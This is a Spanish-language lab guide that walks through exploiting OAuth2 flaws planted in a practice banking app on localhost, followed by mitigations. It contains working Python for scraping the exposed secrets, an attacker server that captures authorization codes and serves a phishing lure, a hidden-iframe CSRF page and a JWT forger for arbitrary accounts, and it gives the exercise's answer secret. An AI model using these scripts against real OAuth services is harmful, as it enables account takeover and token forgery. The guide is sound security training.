# 🔓 Guía Completa de Explotación de Vulnerabilidades OAuth2

## 📋 Índice

1. [Introducción](#introducción)
2. [Conceptos Previos](#conceptos-previos)
3. [Vulnerabilidades Implementadas](#vulnerabilidades-implementadas)
4. [Nivel 1: Exposición de Client Secret](#nivel-1-exposición-de-client-secret)
5. [Nivel 2: Ataque CSRF en OAuth2](#nivel-2-ataque-csrf-en-oauth2)
6. [Nivel 3: Explotación Avanzada](#nivel-3-explotación-avanzada)
7. [Herramientas Necesarias](#herramientas-necesarias)
8. [Mitigaciones](#mitigaciones)

---

## 🎯 Introducción

Este documento describe paso a paso cómo explotar las vulnerabilidades de OAuth2 implementadas en el **Banco Nacional** con fines educativos. El sistema contiene **intencionalmente** múltiples fallas de seguridad que permiten:

- ✅ Obtener credenciales OAuth2 expuestas
- ✅ Realizar ataques CSRF en el flujo OAuth2
- ✅ Suplantar identidades mediante tokens manipulados
- ✅ Acceder a cuentas sin autorización

> ⚠️ **ADVERTENCIA**: Esta información es exclusivamente para fines educativos en entornos controlados.

---

## 📚 Conceptos Previos

### ¿Qué es OAuth2?

OAuth2 es un **protocolo de autorización** que permite a aplicaciones de terceros obtener acceso limitado a un servicio HTTP, ya sea en nombre del propietario del recurso o en nombre de la propia aplicación.

### Flujo Authorization Code (Vulnerable)

```
┌─────────┐                                      ┌───────────┐
│         │                                      │           │
│ Usuario │                                      │  Banco    │
│         │                                      │ Nacional  │
└────┬────┘                                      └─────┬─────┘
     │                                                 │
     │ 1. Click "Iniciar con Google"                   │
     ├────────────────────────────────────────────────>│
     │                                                 │
     │ 2. Redirect a Google (fake)                     │
     │<────────────────────────────────────────────────┤
     │                                                 │
┌────▼────┐                                            │
│         │                                            │
│ Google  │                                            │
│ (Fake)  │                                            │
└────┬────┘                                            │
     │ 3. Usuario se autentica                         │
     │                                                 │
     │ 4. Redirect con CODE (sin state!)               │
     ├────────────────────────────────────────────────>│
     │                                                 │
     │ 5. Banco intercambia CODE por TOKEN             │
     │    usando CLIENT_SECRET                         │
     │                                                 │
     │ 6. Usuario autenticado                          │
     │<────────────────────────────────────────────────┤
     │                                                 │
```

### Vulnerabilidades Críticas

1. **Client Secret Expuesto**: El `CLIENT_SECRET` está hardcodeado en el código fuente
2. **Sin validación de State**: No se implementa el parámetro `state` para prevenir CSRF
3. **JWT Débil**: El secreto JWT es predecible
4. **Información Expuesta**: Endpoint público expone credenciales OAuth2

---

## 🔍 Vulnerabilidades Implementadas

| Vulnerabilidad | Severidad | CWE | Impacto |
|----------------|-----------|-----|---------|
| **Client Secret Exposed** | 🔴 CRÍTICA | CWE-798 | Compromiso total del sistema OAuth2 |
| **Missing State Parameter** | 🔴 CRÍTICA | CWE-352 | Ataques CSRF, secuestro de sesión |
| **Weak JWT Secret** | 🟠 ALTA | CWE-326 | Falsificación de tokens |
| **Information Disclosure** | 🟠 ALTA | CWE-200 | Exposición de credenciales |

---

## 🎮 Nivel 1: Exposición de Client Secret

### Objetivo

Encontrar y extraer el `CLIENT_SECRET` expuesto públicamente en el sistema.

### Pasos de Explotación

#### 1.1 Análisis del Código Fuente

El sistema tiene el `CLIENT_SECRET` hardcodeado en `app_banco.py`:

```python
# ============================================
# CONFIGURACIÓN OAUTH2 GOOGLE
# ============================================
GOOGLE_CLIENT_ID = "banco-app-123456"
GOOGLE_CLIENT_SECRET = "SECRET_SUPER_SECRETO_EXPUESTO_123"  # ⚠️ VULNERABLE
GOOGLE_JWT_SECRET = "jwt_secret_debil"
```

#### 1.2 Acceso mediante Endpoint Público

El sistema expone un endpoint que revela las credenciales:

```bash
# Acceder al endpoint de información OAuth
curl http://127.0.0.1:5000/oauth/info

# O simplemente navegar a:
# http://127.0.0.1:5000/oauth/info
```

**Respuesta esperada:**

```html
<!DOCTYPE html>
<html>
<head>
    <title>OAuth2 Credentials - Banco Nacional</title>
</head>
<body>
    <div class="credential-item">
        <div class="credential-label">CLIENT_ID</div>
        <div class="credential-value">banco-app-123456</div>
    </div>
    <div class="credential-item">
        <div class="credential-label">CLIENT_SECRET</div>
        <div class="credential-value">SECRET_SUPER_SECRETO_EXPUESTO_123</div>
    </div>
    <div class="credential-item">
        <div class="credential-label">JWT_SECRET</div>
        <div class="credential-value">jwt_secret_debil</div>
    </div>
</body>
</html>
```

#### 1.3 Extracción Manual

1. Accede a `http://127.0.0.1:5000/oauth/info`
2. Copia el `CLIENT_SECRET`: `SECRET_SUPER_SECRETO_EXPUESTO_123`
3. Copia el `JWT_SECRET`: `jwt_secret_debil`
4. Copia el `CLIENT_ID`: `banco-app-123456`

#### 1.4 Extracción con Script

```python
import requests
import re

def extract_oauth_credentials():
    url = "http://127.0.0.1:5000/oauth/info"
    
    response = requests.get(url)
    
    if response.status_code == 200:
        html = response.text
        
        # Extraer CLIENT_SECRET
        secret_match = re.search(r'CLIENT_SECRET.*?credential-value[^>]*>([^<]+)', html, re.DOTALL)
        client_id_match = re.search(r'CLIENT_ID.*?credential-value[^>]*>([^<]+)', html, re.DOTALL)
        jwt_match = re.search(r'JWT_SECRET.*?credential-value[^>]*>([^<]+)', html, re.DOTALL)
        
        if secret_match and client_id_match and jwt_match:
            print("[+] Credenciales OAuth2 Extraídas:")
            print(f"    CLIENT_ID: {client_id_match.group(1).strip()}")
            print(f"    CLIENT_SECRET: {secret_match.group(1).strip()}")
            print(f"    JWT_SECRET: {jwt_match.group(1).strip()}")
            return {
                'client_id': client_id_match.group(1).strip(),
                'client_secret': secret_match.group(1).strip(),
                'jwt_secret': jwt_match.group(1).strip()
            }
    
    print("[-] No se pudieron extraer las credenciales")
    return None

if __name__ == "__main__":
    creds = extract_oauth_credentials()
```

#### 1.5 Verificación

Para verificar que obtuviste el secret correcto:

```bash
# Calcular MD5 del secret
echo -n "SECRET_SUPER_SECRETO_EXPUESTO_123" | md5sum

# Resultado esperado: 
# Debe coincidir con el hash de verificación en app_enunciados.py
```

### ✅ Completar Nivel 1

Envía el `CLIENT_SECRET` al endpoint de verificación:

```bash
curl -X POST http://127.0.0.1:5001/verificar/oauth \
  -H "Content-Type: application/json" \
  -d '{"respuesta": "SECRET_SUPER_SECRETO_EXPUESTO_123"}'
```

---

## 🎯 Nivel 2: Ataque CSRF en OAuth2

### Objetivo

Explotar la ausencia del parámetro `state` para realizar un ataque CSRF y vincular la cuenta OAuth de la víctima con la sesión del atacante.

### Teoría del Ataque

El flujo OAuth2 **NO implementa el parámetro `state`**, lo que permite:

1. El atacante inicia un flujo OAuth2 pero **NO lo completa**
2. El atacante obtiene un `code` válido
3. El atacante engaña a la víctima para que use ese `code`
4. La cuenta OAuth de la víctima queda vinculada a la sesión del atacante

### Pasos de Explotación

#### 2.1 Analizar el Flujo OAuth

Examina la ruta de autorización en `app_banco.py`:

```python
@app.route('/oauth/callback')
def oauth_callback():
    code = request.args.get('code')
    # ⚠️ NO HAY VALIDACIÓN DE STATE
    
    if not code:
        flash('Error en la autenticación OAuth', 'danger')
        return redirect(url_for('banco_login'))
    
    # Intercambiar code por token (vulnerable)
    token_data = exchange_code_for_token(code)
    # ...
```

**Observa que:**
- ❌ No se genera un `state` al iniciar el flujo
- ❌ No se valida el `state` en el callback
- ❌ Cualquier `code` válido será aceptado

#### 2.2 Preparar el Ataque

**Paso 1: Configurar el servidor del atacante**

Crea `attacker_server.py`:

```python
from flask import Flask, render_template_string, request

app = Flask(__name__)

# Aquí almacenaremos el CODE capturado
captured_code = None

@app.route('/csrf-capture')
def csrf_capture():
    global captured_code
    code = request.args.get('code')
    
    if code:
        captured_code = code
        print(f"[+] CODE capturado: {code}")
        return "<h1>✅ Código capturado exitosamente</h1>"
    
    return "<h1>❌ No se recibió código</h1>"

@app.route('/attack')
def show_attack():
    if not captured_code:
        return "<h1>⏳ Esperando capturar un CODE...</h1>"
    
    # Página maliciosa que la víctima visitará
    malicious_page = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>¡Gana un iPhone 15 Pro GRATIS! 🎁</title>
        <style>
            body {{
                font-family: Arial, sans-serif;
                text-align: center;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                padding: 50px;
            }}
            .prize {{
                background: white;
                color: #333;
                padding: 30px;
                border-radius: 15px;
                max-width: 600px;
                margin: 0 auto;
            }}
            .btn {{
                background: #10b981;
                color: white;
                padding: 15px 30px;
                border: none;
                border-radius: 5px;
                font-size: 18px;
                cursor: pointer;
                text-decoration: none;
                display: inline-block;
                margin-top: 20px;
            }}
        </style>
    </head>
    <body>
        <div class="prize">
            <h1>🎉 ¡FELICIDADES! 🎉</h1>
            <h2>Has sido seleccionado para ganar un iPhone 15 Pro</h2>
            <p>Solo debes hacer click en el botón de abajo para reclamar tu premio</p>
            <a href="http://127.0.0.1:5000/oauth/callback?code={captured_code}" class="btn">
                🎁 RECLAMAR PREMIO AHORA
            </a>
        </div>
        
        <!-- También podemos hacer auto-submit -->
        <script>
            // Descomentar para hacer el ataque automático
            // setTimeout(() => {{
            //     window.location.href = "http://127.0.0.1:5000/oauth/callback?code={captured_code}";
            // }}, 2000);
        </script>
    </body>
    </html>
    """
    
    return malicious_page

if __name__ == '__main__':
    print("="*60)
    print("🎯 SERVIDOR DE ATAQUE CSRF OAuth2")
    print("="*60)
    print()
    print("[1] Inicia sesión OAuth en el banco como ATACANTE")
    print("[2] Configura el redirect_uri a: http://127.0.0.1:8888/csrf-capture")
    print("[3] Captura el CODE y visita: http://127.0.0.1:8888/attack")
    print("[4] Envía esa URL a la VÍCTIMA")
    print()
    print("="*60)
    app.run(host='127.0.0.1', port=8888, debug=True)
```

**Paso 2: Iniciar el servidor malicioso**

```bash
python attacker_server.py
```

#### 2.3 Ejecutar el Ataque

**Como ATACANTE:**

1. Abre tu navegador en modo incógnito
2. Ve a `http://127.0.0.1:5000`
3. Click en "Iniciar con Google"
4. **MODIFICA** la URL de callback antes de autorizar:

```
# URL original:
http://127.0.0.1:5000/oauth/google/authorize?
  response_type=code&
  client_id=banco-app-123456&
  redirect_uri=http://127.0.0.1:5000/oauth/callback&
  scope=email+profile

# URL modificada (interceptar el CODE):
http://127.0.0.1:5000/oauth/google/authorize?
  response_type=code&
  client_id=banco-app-123456&
  redirect_uri=http://127.0.0.1:8888/csrf-capture&  ← MODIFICADO
  scope=email+profile
```

5. Autoriza la aplicación
6. El CODE será capturado por tu servidor en `http://127.0.0.1:8888/csrf-capture`
7. Ve a `http://127.0.0.1:8888/attack` para obtener la página maliciosa

**Como VÍCTIMA (usar otro navegador/perfil):**

1. La víctima recibe un enlace como: 
   ```
   http://127.0.0.1:8888/attack
   ```
2. La víctima hace click (esperando ganar un iPhone)
3. Es redirigida a:
   ```
   http://127.0.0.1:5000/oauth/callback?code=CODIGO_DEL_ATACANTE
   ```
4. El sistema vincula la cuenta OAuth de la VÍCTIMA con la sesión del ATACANTE

**Resultado:**
- ✅ El atacante ahora tiene acceso a la cuenta de la víctima
- ✅ Cualquier acción de la víctima beneficia al atacante
- ✅ La víctima no se da cuenta del secuestro

#### 2.4 Variante: Ataque Automático con iFrame

```html
<!DOCTYPE html>
<html>
<head>
    <title>Sitio legítimo</title>
</head>
<body>
    <h1>Bienvenido a nuestro sitio</h1>
    <p>Contenido normal...</p>
    
    <!-- iFrame invisible que ejecuta el ataque -->
    <iframe 
        src="http://127.0.0.1:5000/oauth/callback?code=CODIGO_CAPTURADO" 
        style="display:none;">
    </iframe>
</body>
</html>
```

#### 2.5 Detectar la Vulnerabilidad

**Checklist para identificar:**

```python
# ❌ VULNERABLE - Sin state parameter
@app.route('/oauth/callback')
def oauth_callback():
    code = request.args.get('code')
    # No se valida 'state'
    # ...

# ✅ SEGURO - Con state parameter
@app.route('/oauth/callback')
def oauth_callback():
    code = request.args.get('code')
    state = request.args.get('state')
    
    # Validar state contra sesión
    if state != session.get('oauth_state'):
        return "Error: State inválido", 403
    # ...
```

### ✅ Completar Nivel 2

Documenta el ataque exitoso con:
- Screenshot del servidor capturando el CODE
- Screenshot de la página maliciosa
- Screenshot del resultado final

---

## 🚀 Nivel 3: Explotación Avanzada

### Objetivo

Combinar múltiples vulnerabilidades para crear tokens OAuth falsos y acceder a cualquier cuenta.

### 3.1 Forjar un Token JWT

Con el `JWT_SECRET` obtenido en el Nivel 1, podemos crear tokens válidos:

```python
import jwt
import time
from datetime import datetime, timedelta

# Credenciales obtenidas en Nivel 1
JWT_SECRET = "jwt_secret_debil"
CLIENT_ID = "banco-app-123456"

def forge_oauth_token(email, name="Hacker"):
    """
    Crea un token OAuth2 falso pero válido
    """
    payload = {
        'sub': email,
        'email': email,
        'name': name,
        'picture': 'https://via.placeholder.com/150',
        'iat': int(time.time()),
        'exp': int((datetime.now() + timedelta(hours=24)).timestamp()),
        'iss': 'http://127.0.0.1:5000',
        'aud': CLIENT_ID
    }
    
    token = jwt.encode(payload, JWT_SECRET, algorithm='HS256')
    print(f"[+] Token JWT forjado para: {email}")
    print(f"[+] Token: {token}")
    return token

# Forjar token para cualquier usuario
admin_token = forge_oauth_token("admin@banco.com", "Administrator")
victim_token = forge_oauth_token("victim@gmail.com", "Victim User")
```

### 3.2 Usar el Token Forjado

```python
import requests

def use_forged_token(token):
    """
    Usa el token forjado para acceder a recursos protegidos
    """
    session = requests.Session()
    
    # Método 1: Cookie
    session.cookies.set('oauth_token', token)
    
    # Método 2: Header Authorization
    headers = {
        'Authorization': f'Bearer {token}'
    }
    
    # Acceder al dashboard
    response = session.get('http://127.0.0.1:5000/banco/dashboard')
    
    if response.status_code == 200:
        print("[+] ✅ Acceso exitoso con token forjado!")
        return True
    else:
        print("[-] ❌ El token fue rechazado")
        return False

# Usar el token del admin
use_forged_token(admin_token)
```

### 3.3 Automatización Completa del Ataque

Script completo que combina todos los ataques:

```python
#!/usr/bin/env python3
"""
🎯 OAuth2 Complete Exploitation Tool
Combina todas las vulnerabilidades para acceso total
"""

import requests
import jwt
import hashlib
import time
from datetime import datetime, timedelta

class OAuth2Exploiter:
    def __init__(self, target_url="http://127.0.0.1:5000"):
        self.target = target_url
        self.client_id = None
        self.client_secret = None
        self.jwt_secret = None
        
    def step1_extract_credentials(self):
        """Extrae las credenciales OAuth2 expuestas"""
        print("\n[STEP 1] Extrayendo credenciales OAuth2...")
        
        url = f"{self.target}/oauth/info"
        response = requests.get(url)
        
        if response.status_code == 200:
            # Parsear HTML para extraer credenciales
            html = response.text
            
            import re
            secret_match = re.search(r'CLIENT_SECRET.*?credential-value[^>]*>([^<]+)', html, re.DOTALL)
            client_id_match = re.search(r'CLIENT_ID.*?credential-value[^>]*>([^<]+)', html, re.DOTALL)
            jwt_match = re.search(r'JWT_SECRET.*?credential-value[^>]*>([^<]+)', html, re.DOTALL)
            
            if all([secret_match, client_id_match, jwt_match]):
                self.client_id = client_id_match.group(1).strip()
                self.client_secret = secret_match.group(1).strip()
                self.jwt_secret = jwt_match.group(1).strip()
                
                print(f"  ✅ CLIENT_ID: {self.client_id}")
                print(f"  ✅ CLIENT_SECRET: {self.client_secret}")
                print(f"  ✅ JWT_SECRET: {self.jwt_secret}")
                return True
        
        print("  ❌ No se pudieron extraer credenciales")
        return False
    
    def step2_forge_token(self, email, name="Hacker"):
        """Forja un token JWT válido"""
        print(f"\n[STEP 2] Forjando token para {email}...")
        
        if not self.jwt_secret:
            print("  ❌ Primero debes ejecutar step1")
            return None
        
        payload = {
            'sub': email,
            'email': email,
            'name': name,
            'picture': 'https://via.placeholder.com/150',
            'iat': int(time.time()),
            'exp': int((datetime.now() + timedelta(hours=24)).timestamp()),
            'iss': self.target,
            'aud': self.client_id
        }
        
        token = jwt.encode(payload, self.jwt_secret, algorithm='HS256')
        print(f"  ✅ Token forjado: {token[:50]}...")
        return token
    
    def step3_access_with_token(self, token):
        """Accede al sistema usando el token forjado"""
        print("\n[STEP 3] Accediendo al sistema con token forjado...")
        
        session = requests.Session()
        session.cookies.set('oauth_token', token)
        
        # Intentar acceder al dashboard
        response = session.get(f"{self.target}/banco/dashboard")
        
        if response.status_code == 200:
            print("  ✅ Acceso exitoso al dashboard!")
            return True
        else:
            print(f"  ❌ Acceso denegado (Status: {response.status_code})")
            return False
    
    def full_exploit(self, target_email="admin@banco.com"):
        """Ejecuta el exploit completo"""
        print("="*60)
        print("🎯 OAUTH2 COMPLETE EXPLOITATION")
        print("="*60)
        
        # Paso 1: Extraer credenciales
        if not self.step1_extract_credentials():
            return False
        
        # Paso 2: Forjar token
        token = self.step2_forge_token(target_email, "Hacker Admin")
        if not token:
            return False
        
        # Paso 3: Acceder con el token
        success = self.step3_access_with_token(token)
        
        if success:
            print("\n" + "="*60)
            print("✅ EXPLOIT COMPLETADO EXITOSAMENTE")
            print("="*60)
            print(f"\n💎 Token de acceso:\n{token}\n")
        
        return success

if __name__ == "__main__":
    exploiter = OAuth2Exploiter()
    exploiter.full_exploit("admin@banco.com")
```

Guarda este script como `oauth2_full_exploit.py` y ejecútalo:

```bash
python oauth2_full_exploit.py
```

---

## 🛠️ Herramientas Necesarias

### Burp Suite

Configuración para interceptar y modificar requests OAuth2:

```
1. Configurar proxy (127.0.0.1:8080)
2. Interceptar el request de autorización
3. Modificar el redirect_uri
4. Capturar el authorization code
```

### Python Scripts

```bash
# Instalar dependencias
pip install requests PyJWT flask

# Scripts necesarios:
# - oauth2_extract_creds.py (extrae credenciales)
# - oauth2_forge_token.py (forja tokens)
# - csrf_server.py (servidor de ataque CSRF)
# - oauth2_full_exploit.py (exploit completo)
```

### Postman Collection

```json
{
  "info": {
    "name": "OAuth2 Exploit Collection",
    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
  },
  "item": [
    {
      "name": "1. Extraer Credenciales",
      "request": {
        "method": "GET",
        "header": [],
        "url": {
          "raw": "http://127.0.0.1:5000/oauth/info",
          "protocol": "http",
          "host": ["127", "0", "0", "1"],
          "port": "5000",
          "path": ["oauth", "info"]
        }
      }
    },
    {
      "name": "2. Iniciar flujo OAuth",
      "request": {
        "method": "GET",
        "header": [],
        "url": {
          "raw": "http://127.0.0.1:5000/oauth/google/authorize?response_type=code&client_id=banco-app-123456&redirect_uri=http://127.0.0.1:5000/oauth/callback&scope=email profile",
          "protocol": "http",
          "host": ["127", "0", "0", "1"],
          "port": "5000",
          "path": ["oauth", "google", "authorize"],
          "query": [
            {"key": "response_type", "value": "code"},
            {"key": "client_id", "value": "banco-app-123456"},
            {"key": "redirect_uri", "value": "http://127.0.0.1:5000/oauth/callback"},
            {"key": "scope", "value": "email profile"}
          ]
        }
      }
    }
  ]
}
```

---

## 🛡️ Mitigaciones

### 1. Proteger el Client Secret

**❌ VULNERABLE:**
```python
GOOGLE_CLIENT_SECRET = "SECRET_SUPER_SECRETO_EXPUESTO_123"
```

**✅ SEGURO:**
```python
import os
from dotenv import load_dotenv

load_dotenv()
GOOGLE_CLIENT_SECRET = os.getenv('OAUTH_CLIENT_SECRET')

# En .env (NO commitear):
# OAUTH_CLIENT_SECRET=secret_generado_aleatoriamente_seguro
```

### 2. Implementar State Parameter

**❌ VULNERABLE:**
```python
@app.route('/oauth/callback')
def oauth_callback():
    code = request.args.get('code')
    # Sin validación de state
```

**✅ SEGURO:**
```python
import secrets

@app.route('/oauth/login')
def oauth_login():
    # Generar state aleatorio
    state = secrets.token_urlsafe(32)
    session['oauth_state'] = state
    
    # Incluir en la URL de autorización
    auth_url = f"{GOOGLE_AUTH_URL}?response_type=code&client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&state={state}&scope=email+profile"
    return redirect(auth_url)

@app.route('/oauth/callback')
def oauth_callback():
    code = request.args.get('code')
    state = request.args.get('state')
    
    # Validar state
    if not state or state != session.get('oauth_state'):
        return "Error: State inválido (posible ataque CSRF)", 403
    
    # Limpiar state usado
    session.pop('oauth_state', None)
    
    # Continuar con el flujo...
```

### 3. Usar Secretos Fuertes para JWT

**❌ VULNERABLE:**
```python
JWT_SECRET = "jwt_secret_debil"
```

**✅ SEGURO:**
```python
import os
import secrets

# Generar secret aleatorio
JWT_SECRET = os.getenv('JWT_SECRET') or secrets.token_urlsafe(64)

# Mejor aún: usar claves asimétricas (RS256)
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

with open('private_key.pem', 'rb') as f:
    private_key = serialization.load_pem_private_key(
        f.read(),
        password=None,
        backend=default_backend()
    )
```

### 4. Eliminar Endpoints de Información

**❌ VULNERABLE:**
```python
@app.route('/oauth/info')
def oauth_info():
    return render_template('oauth_info.html',
        client_id=GOOGLE_CLIENT_ID,
        client_secret=GOOGLE_CLIENT_SECRET,  # 😱
        jwt_secret=GOOGLE_JWT_SECRET)
```

**✅ SEGURO:**
```python
# ¡Eliminar este endpoint completamente!
# Nunca exponer credenciales sensibles
```

### 5. Implementar PKCE (Proof Key for Code Exchange)

```python
import hashlib
import base64
import secrets

def generate_pkce_pair():
    """Genera code_verifier y code_challenge"""
    code_verifier = base64.urlsafe_b64encode(
        secrets.token_bytes(32)
    ).decode('utf-8').rstrip('=')
    
    code_challenge = base64.urlsafe_b64encode(
        hashlib.sha256(code_verifier.encode()).digest()
    ).decode('utf-8').rstrip('=')
    
    return code_verifier, code_challenge

@app.route('/oauth/login')
def oauth_login():
    state = secrets.token_urlsafe(32)
    code_verifier, code_challenge = generate_pkce_pair()
    
    session['oauth_state'] = state
    session['code_verifier'] = code_verifier
    
    auth_url = f"{GOOGLE_AUTH_URL}?response_type=code&client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&state={state}&code_challenge={code_challenge}&code_challenge_method=S256&scope=email+profile"
    
    return redirect(auth_url)
```

### 6. Validar Redirect URI

**❌ VULNERABLE:**
```python
# Acepta cualquier redirect_uri
redirect_uri = request.args.get('redirect_uri')
```

**✅ SEGURO:**
```python
ALLOWED_REDIRECT_URIS = [
    'http://127.0.0.1:5000/oauth/callback',
    'https://banco.com/oauth/callback'
]

redirect_uri = request.args.get('redirect_uri')
if redirect_uri not in ALLOWED_REDIRECT_URIS:
    return "Error: Redirect URI no autorizado", 400
```

---

## 📊 Resumen de Vulnerabilidades

| Vulnerabilidad | Facilidad de Explotación | Impacto | Mitigación |
|----------------|-------------------------|---------|------------|
| **Client Secret Expuesto** | 🟢 Muy Fácil | 🔴 Crítico | Variables de entorno |
| **Sin State Parameter** | 🟡 Medio | 🔴 Crítico | Implementar state + validación |
| **JWT Secret Débil** | 🟡 Medio | 🟠 Alto | Secretos fuertes aleatorios |
| **Endpoint de Info** | 🟢 Muy Fácil | 🟠 Alto | Eliminar endpoint |
| **Sin PKCE** | 🟠 Difícil | 🟡 Medio | Implementar PKCE |
| **Redirect URI Abierto** | 🟡 Medio | 🟠 Alto | Whitelist de URIs |

---

## 🎓 Conclusión

Has aprendido a:

- ✅ Identificar credenciales OAuth2 expuestas
- ✅ Explotar la ausencia del parámetro `state` (CSRF)
- ✅ Forjar tokens JWT con secretos débiles
- ✅ Combinar múltiples vulnerabilidades
- ✅ Implementar mitigaciones efectivas

### Siguiente Paso

Prueba estos ataques en el entorno de laboratorio y luego implementa las mitigaciones para hacer el sistema seguro.

---

## 📚 Referencias

- [RFC 6749 - OAuth 2.0 Authorization Framework](https://tools.ietf.org/html/rfc6749)
- [RFC 6750 - OAuth 2.0 Bearer Token Usage](https://tools.ietf.org/html/rfc6750)
- [RFC 7636 - PKCE](https://tools.ietf.org/html/rfc7636)
- [OWASP OAuth 2.0 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OAuth2_Cheat_Sheet.html)
- [CWE-352: Cross-Site Request Forgery (CSRF)](https://cwe.mitre.org/data/definitions/352.html)
- [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)

---

**Creado con 💙 para fines educativos**  
*Recuerda: Usa este conocimiento de forma ética y responsable*
